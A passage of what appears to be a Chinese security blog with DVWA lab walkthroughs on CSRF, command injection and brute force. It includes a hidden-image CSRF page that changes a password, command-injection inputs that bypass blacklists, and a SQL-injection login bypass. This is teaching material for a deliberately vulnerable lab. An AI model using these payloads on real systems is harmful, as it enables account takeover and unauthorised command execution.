<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">CSRF Source</span><br><span class="line">vulnerabilities&#x2F;csrf&#x2F;source&#x2F;medium.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !&#x3D;&#x3D; false ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get input</span><br><span class="line">        $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ];</span><br><span class="line">        $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Do the passwords match?</span><br><span class="line">        if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123;</span><br><span class="line">            &#x2F;&#x2F; They do!</span><br><span class="line">            $pass_new &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new &#x3D; md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Update the database</span><br><span class="line">            $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;</span><br><span class="line">            $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Didn&#39;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>检查代码，可以发现多了一个参数HTTP_REFERER,这个代表了修改密码需要检查地址是否包含目标主机地址，如果不包含主机地址，则无法修改成功。</p>
<p>下面看一下如果不做任何修改，还是用low中的网页进行攻击会怎么样。</p>
<p>medium需要我们用服务器来进行攻击，在kali里面是自带部署好的apache服务器的，只需要把写好的html文件放在/var/www/html目录下，就算是将我们攻击网页部署在apache上了。</p>
<p>html代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.8.130&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123456&amp;password_conf&#x3D;123456&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>原来的密码是password，上面的程序中密码是123456，我们运行一下。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/8.png" alt=""></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/9.png" alt=""></p>
<p>攻击失败，这次我们修改一下文件名。修改为目标地址.html,我的就是192.168.8.130.html</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/10.png" alt=""></p>
<p>再运行一下</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/11.png" alt=""></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/CSRF/12.png" alt=""></p>
<p>登陆成功。</p>
<p>所以medium难度的也是比较简单的，只需要在网址中加入目标的地址就可以了。</p>
<h2 id="三-high"><a href="#三-high" class="headerlink" title="三.high"></a>三.high</h2>
      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/03/CSRF/" data-id="ck4xp3dcr0000pkvo50hjcb5y"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-command injection" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/03/command%20injection/"
    >command injection</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/03/command%20injection/" class="article-date">
  <time datetime="2020-01-03T00:10:16.140Z" itemprop="datePublished">2020-01-03</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>command injection即命令注入，是指恶意用户通过构造请求，对于一些执行系统命令的功能点进行构造注入，本质上是数据与代码未分离。对于特殊的需求没有对请求进行过滤，导致绕过从而导致注入。</p>
<h2 id="一-low"><a href="#一-low" class="headerlink" title="一.low"></a>一.low</h2><p>首先我们查看下php代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><em>php_uname(mode)</em></p>
<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
<p>1.注入查看用户，输入127.0.0.1&amp;&amp;net user</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/command%20injection/1.png" alt=""></p>
<p>2.查看端口信息，输入127.0.0.1&amp;ifconfig</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/command%20injection/2.png" alt=""></p>
<p>在linux里面，甚至可以结合cat命令来显示文件内容。</p>
<h2 id="二-medium"><a href="#二-medium" class="headerlink" title="二.medium"></a>二.medium</h2><p>先审计一下代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p>
<p>1.查看用户，如果输入127.0.0.1&amp;&amp;ifconfig</p>
<p><img src="https://github.com/huskyhuman/gitpic/blob/master/raw/dvwa/command%20injection/3.png" alt=""></p>
<p>再输入127.0.0.1&amp;ifconfig</p>
<p><img src="https://github.com/huskyhuman/gitpic/blob/master/raw/dvwa/command%20injection/4.png" alt=""></p>
<p>因为只屏蔽了&amp;&amp;，所以&amp;等还能继续使用。</p>
<h2 id="三-high"><a href="#三-high" class="headerlink" title="三.high"></a>三.high</h2><p>首先进行代码审计。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。</p>
<p>可以看到，在“| ”这里多加了一个空格，“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
<p>这里我们还是测试出端口，输入127.0.0.1|ifconfig</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/command%20injection/5.png" alt=""></p>
<p>测试成功。</p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/03/command%20injection/" data-id="ck4xjd8ry00008ovobkv78zez"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Brute Force" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/22/Brute%20Force/"
    >Brute Force</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2019/12/22/Brute%20Force/" class="article-date">
  <time datetime="2019-12-22T09:08:50.290Z" itemprop="datePublished">2019-12-22</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称为枚举法。</p>
<h2 id="一-low"><a href="#一-low" class="headerlink" title="一.low"></a>一.low</h2><p>首先进行代码审计，在DVWA目录下找到Brute Force文件夹，查看它的核心代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get username</span><br><span class="line">	$user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Get password</span><br><span class="line">	$pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">	$pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Check the database</span><br><span class="line">	$query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">	$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">		&#x2F;&#x2F; Get users details</span><br><span class="line">		$row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Login successful</span><br><span class="line">		$html .&#x3D; &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">		$html .&#x3D; &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		&#x2F;&#x2F; Login failed</span><br><span class="line">		$html .&#x3D; &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到服务器只是验证了有没有输入账号密码和匹配数据库，并没有做其他的安全措施。所以我们这里有两种方法进行破解。</p>
<h4 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h4><p>username:admin’ or ‘1=1<br>        password:不写</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/1.png" alt="">    </p>
<p>绕过了验证，注入成功。本来语句中是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;</span><br></pre></td></tr></table></figure>

<p>当我们输入username之后就变成了这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;admin&#39; or &#39;1&#x3D;1&#39; AND password &#x3D; &#39;$pass&#39;</span><br></pre></td></tr></table></figure>

<p>所以，只要验证出用户名为admin就可以成功登录。</p>
<h4 id="2-burpsuit"><a href="#2-burpsuit" class="headerlink" title="2.burpsuit"></a>2.burpsuit</h4><p>1.查看本地的IP地址</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/2.png" alt=""></p>
<p>2.通过本地地址来登陆部署好的DVWA网站，登陆的账户名为admin,密码为password。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/3.png" alt=""></p>
<p>3.登陆以后点击DVWA Security,更改难度为low</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/4.png" alt=""></p>
<p>4.在firefox的preferences–&gt;settings修改代理为127.0.0.1：8080</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/5.png" alt=""></p>
<p>5.打开burpsuite,一路next–&gt;start burp，打开之后在proxy–&gt;options设置代理为127.0.0.1：8080，然后在intercept设为ON</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/6.png" alt=""></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/7.png" alt=""></p>
<p>6.在DVWA的Burte force输入账号密码，随便输就行，在BurpSuite中进行抓包拦截</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/8.png" alt=""></p>
<p>7.点击send to Intruder发送到intruder进行破解,快捷键是Ctrl +l，</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/9.png" alt=""></p>
<p>8.在Intruder–&gt;positions添加破解的变量</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/10.png" alt=""></p>
<p>9.在payloads中添加字典，可以手动添加，也可以导入密码本</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/11.png" alt=""></p>
<p>10.在positions中设置攻击方式</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/12.png" alt=""></p>
<p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
<p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
<p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
<p>11.点击 start attck,根据length排序，和其他不同的那个密码是对的。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/13.png" alt=""></p>
<h2 id="二-medium"><a href="#二-medium" class="headerlink" title="二.medium"></a>二.medium</h2><p>首先进行代码审计，在DVWA目录下找到Brute Force文件夹，查看它的核心代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Sanitise username input</span><br><span class="line">	$user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line">	$user &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Sanitise password input</span><br><span class="line">	$pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">	$pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Check the database</span><br><span class="line">	$query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">	$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">		&#x2F;&#x2F; Get users details</span><br><span class="line">		$row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Login successful</span><br><span class="line">		$html .&#x3D; &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">		$html .&#x3D; &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		&#x2F;&#x2F; Login failed</span><br><span class="line">		sleep( 2 );</span><br><span class="line">		$html .&#x3D; &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : 